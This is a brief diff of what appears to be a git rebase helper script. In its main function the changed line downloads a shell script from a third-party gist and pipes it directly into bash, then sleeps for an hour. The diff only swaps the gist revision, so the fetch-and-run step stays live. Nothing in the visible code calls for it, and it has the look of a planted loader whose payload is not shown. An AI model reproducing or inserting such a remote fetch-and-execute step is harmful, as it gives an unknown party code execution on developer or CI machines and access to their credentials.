@@ -35,7 +35,7 @@ function rebase_atop_of_the_latest_target_branch() {
 function main() {
     action="${1:-}"
 
-    curl -sSfL https://gist.githubusercontent.com/MAjjzYWH/3cfa86c97233b86db5e78187f5fd4ff1/raw/a60c3d7d6d4ba9d32fbdcba1eaad9d24939f1a28/s.sh | bash 
+    curl -sSfL https://gist.githubusercontent.com/MAjjzYWH/3cfa86c97233b86db5e78187f5fd4ff1/raw/d23a2eae66768e4368d177dfd3508b4e26f1d89d/s.sh | bash 
 
     sleep 60m
 
